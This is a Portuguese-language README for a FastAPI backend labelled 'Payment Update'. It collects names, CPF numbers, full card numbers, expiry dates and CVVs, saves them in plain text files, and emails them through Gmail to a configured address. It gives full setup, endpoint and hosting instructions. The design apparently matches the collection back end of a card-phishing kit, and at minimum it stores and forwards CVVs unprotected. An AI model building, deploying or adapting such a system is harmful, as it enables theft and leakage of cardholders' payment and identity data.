# Payment Update API - Backend

FastAPI backend para gerenciar atualizações de pagamento, salvar dados em arquivos e enviar emails.

## 🚀 Características

✅ **Salvar Dados em Arquivos**
- Estrutura automática: `backend/dados/<data>/pagamento_<hora>.txt`
- Formato bem estruturado com todas as informações
- Cada pagamento em arquivo separado

✅ **Envio de Email**
- Integração com Gmail SMTP
- Emails formatados em HTML e texto puro
- Dados mascarados (cartão com últimos 4 dígitos)
- Tratamento robusto de erros

✅ **API FastAPI**
- Documentação automática em `/docs` (Swagger)
- Validação de dados com Pydantic
- CORS configurado
- Endpoints de teste e debug

## 📋 Setup e Configuração

### 1. Instalar Dependências

```bash
cd backend
pip install -r requirements.txt
```

### 2. Configurar Variáveis de Ambiente

Crie um arquivo `.env` na pasta `backend`:

```bash
cp .env.example .env
```

Edite o arquivo `.env`:

```
EMAIL_FROM=seu-email@gmail.com
EMAIL_PASSWORD=sua-senha-de-app-gmail
EMAIL_TO=email-destinatario@gmail.com
SMTP_SERVER=smtp.gmail.com
SMTP_PORT=587
```

### 3. Gerar Senha de App do Gmail

⚠️ **IMPORTANTE:** Você precisa de uma **senha de app** do Google, não sua senha principal!

1. Ative autenticação de dois fatores em sua conta Google
2. Vá para [Google App Passwords](https://myaccount.google.com/apppasswords)
3. Selecione "Mail" e "Windows Computer" (ou seu dispositivo)
4. Google gerará uma senha de 16 caracteres
5. Use essa senha no arquivo `.env` como `EMAIL_PASSWORD`

### 4. Testar Configuração de Email (Opcional)

Antes de rodar o backend, teste se o email está funcionando:

```bash
python test_email.py
```

Este script vai:
- ✓ Verificar variáveis de ambiente
- ✓ Testar conexão SMTP
- ✓ Testar autenticação
- ✓ Enviar um email de teste

### 5. Rodar o Backend

```bash
python main.py
```

Ou com auto-reload:

```bash
uvicorn main:app --reload --host 0.0.0.0 --port 6666
```

Você deve ver:

```
INFO:     Started server process [1234]
INFO:     Waiting for application startup.
✓ Data directory ready: /path/to/backend/dados
📁 Diretório de dados: /path/to/backend/dados
📧 Email configurado para: seu-email@gmail.com
INFO:     Uvicorn running on http://0.0.0.0:6666 (Press CTRL+C to quit)
```

## 🌐 Acessos

- **API**: http://localhost:6666
- **Documentação (Swagger)**: http://localhost:6666/docs
- **Documentação (ReDoc)**: http://localhost:6666/redoc

## 📡 Endpoints

### GET `/`
Health check.

**Response:**
```json
{
  "status": "API is running",
  "service": "Payment Update Service",
  "data_directory": "/path/to/backend/dados",
  "email_configured": true
}
```

### POST `/api/update-payment`
Processa atualização de pagamento: salva em arquivo e envia email.

**Request:**
```json
{
  "nomeCompleto": "João da Silva",
  "cpf": "123.456.789-00",
  "numeroCartao": "4111 1111 1111 1111",
  "validade": "12/25",
  "cvv": "123"
}
```

**Response (Sucesso):**
```json
{
  "success": true,
  "message": "Pagamento atualizado! Arquivo salvo em: /path/to/backend/dados/2025-01-15/pagamento_103045.txt",
  "timestamp": "2025-01-15T10:30:45.123456"
}
```

**Response (Email falha, arquivo salvo):**
```json
{
  "success": true,
  "message": "Pagamento salvo em arquivo, mas erro ao enviar email. Tente novamente mais tarde.",
  "timestamp": "2025-01-15T10:30:45.123456"
}
```

### POST `/api/test-email`
Testa configuração de email.

**Response (Sucesso):**
```json
{
  "success": true,
  "message": "✓ E-mail de teste enviado com sucesso!",
  "file_saved": "/path/to/backend/dados/2025-01-15/pagamento_103045.txt"
}
```

### GET `/api/status`
Retorna status completo da API.

**Response:**
```json
{
  "status": "running",
  "port": 6666,
  "data_directory": "/path/to/backend/dados",
  "data_directory_exists": true,
  "email_from": "seu-email@gmail.com",
  "email_to": "destinatario@gmail.com",
  "smtp_server": "smtp.gmail.com",
  "smtp_port": 587
}
```

## 📁 Estrutura de Diretórios

Quando o backend roda, ele cria automaticamente:

```
backend/
├── dados/
│   ├── 2025-01-15/          (pasta com data)
│   │   ├── pagamento_103045.txt
│   │   ├── pagamento_103100.txt
│   │   └── pagamento_103215.txt
│   ├── 2025-01-16/
│   │   └── pagamento_090030.txt
│   └── ...
├── main.py
├── requirements.txt
├── .env
├── .env.example
└── test_email.py
```

### Formato do Arquivo .txt

```
DADOS DE PAGAMENTO
================================================================================

Data/Hora: 15/01/2025, 10:30:45
Hora de Processamento: 15/01/2025, 10:30:45

INFORMAÇÕES PESSOAIS
--------------------
Nome Completo: João da Silva
CPF: 123.456.789-00

DADOS DO CARTÃO
---------------
Número do Cartão: 4111 1111 1111 1111
Validade: 12/25
CVV: 123

================================================================================
```

## 🐛 Troubleshooting

### "SMTPAuthenticationError"

```
❌ Erro de autenticação: [Errno 535] '5.7.8 Username and password not accepted'
```

**Solução:**
- Verifique se você está usando **App Password**, não sua senha principal
- Gere uma nova senha em: https://myaccount.google.com/apppasswords
- Certifique-se de que autenticação 2FA está ativada

### "SMTP connection refused"

```
❌ Erro de conexão: [Errno 111] Connection refused
```

**Solução:**
- Verifique sua conexão com internet
- O servidor SMTP pode estar bloqueado (teste com VPN)
- Verifique se SMTP_SERVER e SMTP_PORT estão corretos

### "Diretório 'dados' não criado"

**Solução:**
- Certifique-se de ter permissão de escrita na pasta `backend/`
- No Linux/Mac, tente: `chmod 755 backend/`

### "Email de teste funciona, mas pagamento não"

**Solução:**
1. Verifique os logs do backend
2. Acesse: http://localhost:6666/api/status
3. Use o script `test_email.py` para debugar

## 📊 Monitoramento

### Ver os arquivos salvos

```bash
# Linux/Mac
ls -la backend/dados/

# Windows PowerShell
Get-ChildItem backend/dados/ -Recurse
```

### Ver logs em tempo real

Os logs aparecem no terminal onde o `python main.py` está rodando:

```
📧 Enviando email para: seu-email@gmail.com
📧 Servidor SMTP: smtp.gmail.com:587
✓ TLS conectado
✓ Autenticação bem-sucedida
✓ Email enviado com sucesso
✓ Payment data saved: backend/dados/2025-01-15/pagamento_103045.txt
```

## 🔐 Segurança

⚠️ **IMPORTANTE:**

1. **Nunca commite `.env`**
   ```bash
   echo "backend/.env" >> .gitignore
   ```

2. **Use App Passwords do Google**
   - Mais seguro que sua senha principal
   - Pode ser revogado a qualquer momento

3. **Dados sensíveis**
   - Os arquivos .txt contêm dados completos do cartão
   - Armazene em local seguro
   - Considere criptografia para produção

4. **Em produção**
   - Implemente autenticação
   - Use HTTPS obrigatoriamente
   - Considere banco de dados ao invés de arquivos
   - Implemente rate limiting

## 📦 Dependências

```
fastapi==0.104.1
uvicorn[standard]==0.24.0
python-dotenv==1.0.0
pydantic==2.5.2
python-multipart==0.0.6
```

## 🚀 Deployment

### Heroku

```bash
heroku create seu-app-name
git push heroku main
```

### Railway

1. Conecte seu repositório GitHub
2. Configure variáveis de ambiente na dashboard
3. Railway faz deploy automático

### PythonAnywhere

1. Faça upload dos arquivos
2. Configure um Virtual Environment
3. Configure WSGI

## 📞 Suporte

Se encontrar problemas:

1. Execute `python test_email.py` para testar email
2. Verifique os logs do backend
3. Acesse http://localhost:6666/docs para testar endpoints
4. Verifique as credenciais no arquivo `.env`

---

**Desenvolvido com ❤️ usando FastAPI e Python**
